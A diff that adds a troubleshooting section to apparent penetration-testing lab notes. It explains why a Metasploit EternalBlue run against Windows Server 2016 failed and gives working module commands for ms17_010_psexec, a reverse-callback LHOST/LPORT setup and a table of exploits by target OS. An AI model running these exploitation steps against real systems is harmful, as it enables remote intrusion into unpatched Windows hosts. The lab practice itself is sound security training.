@@ -126,6 +126,40 @@ wsl -d kali-linux
 
 ---
 
+## Problem 4: EternalBlue Exploit Failing
+
+### Symptom
+`ms17_010_eternalblue` against Windows Server 2016 — exploit ran, overwrite reported success, but always ended with `FAIL` and no session.
+
+### Root Causes
+1. `LHOST` was set to `0.0.0.0` — payload had no callback address
+2. Wrong exploit module for the target OS
+
+### Fix 1: Set correct LHOST
+```bash
+set LHOST 10.10.14.7   # Windows VPN IP, not 0.0.0.0
+set LPORT 4444
+```
+
+### Fix 2: Use the correct exploit
+EternalBlue (`ms17_010_eternalblue`) targets Windows 7 / Server 2008.
+For **Windows Server 2016**, use EternalRomance:
+
+```bash
+use exploit/windows/smb/ms17_010_psexec
+set RHOSTS <target>
+set LHOST 10.10.14.7
+set LPORT 4444
+run
+```
+
+| Exploit | Target OS |
+|---|---|
+| `ms17_010_eternalblue` | Windows 7, Server 2008 |
+| `ms17_010_psexec` (EternalRomance) | Server 2012, 2016, 2019 |
+
+---
+
 ## Working Setup Summary
 
 ```
